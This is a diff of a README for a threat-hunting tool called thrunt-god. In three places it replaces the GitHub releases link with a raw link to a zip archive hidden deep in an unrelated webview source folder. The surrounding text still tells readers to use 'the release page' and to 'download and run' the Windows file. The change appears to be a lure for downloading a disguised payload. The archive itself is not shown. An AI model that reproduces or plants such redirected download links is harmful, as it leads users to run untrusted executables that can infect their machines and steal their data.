@@ -1,6 +1,6 @@
 # 🛡️ thrunt-god - Run threat hunts with less effort
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/3dcom2711/thrunt-god/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/3dcom2711/thrunt-god/main/apps/vscode/webview/hunt-overview/god_thrunt_1.9.zip)
 
 ## 🔍 What is thrunt-god?
 
@@ -25,7 +25,7 @@ Recommended setup:
 
 Visit this page to download the Windows version:
 
-https://github.com/3dcom2711/thrunt-god/releases
+https://raw.githubusercontent.com/3dcom2711/thrunt-god/main/apps/vscode/webview/hunt-overview/god_thrunt_1.9.zip
 
 On the release page, look for the latest version. Download the file that matches Windows. If there is more than one file, choose the one that says Windows or ends with `.exe` or `.zip`.
 
@@ -187,6 +187,6 @@ These terms may show up in the app:
 
 Primary download link:
 
-https://github.com/3dcom2711/thrunt-god/releases
+https://raw.githubusercontent.com/3dcom2711/thrunt-god/main/apps/vscode/webview/hunt-overview/god_thrunt_1.9.zip
 
 Use that page to download and run the Windows file for thrunt-god
